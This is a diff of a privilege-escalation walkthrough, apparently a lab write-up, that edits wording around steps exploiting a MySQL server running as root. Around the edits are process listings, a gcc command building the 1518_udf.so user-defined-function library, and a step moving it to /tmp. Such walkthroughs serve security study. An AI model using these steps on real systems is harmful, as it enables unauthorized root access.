@@ -159,7 +159,7 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
 udp6       0      0 fe80::a00:27ff:fe0a:546 :::*                                -              
 ```
 
-#MYSQL running on local host 
+#MYSQL is running on local host 
 
 List running process using ps and grep “mysql”
 
@@ -173,6 +173,7 @@ Output:
 **root**         708  0.0  0.0   2596  1664 ?        Ss   02:22   0:00 /bin/sh /usr/bin/mysqld_safe
 **root**         885  0.0 22.8 1286264 462124 ?      Sl   02:22   0:01 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock
 ```
+#MYSQL is running through root user.
 
 # Exploiatation:
 
@@ -192,7 +193,7 @@ Create a shared library
 gcc -g -shared -Wl,-soname,1518_udf2.so -o [1518_udf.so](http://1518.so/) 1518.o -lc
 ```
 
-Find any writable directory and move the 1518_udf.so in to that directory.(you can use current directory )
+Find any writable directory and move the 1518_udf.so in to that directory.
 
 ```
 mv ./1518_udf.so /tmp
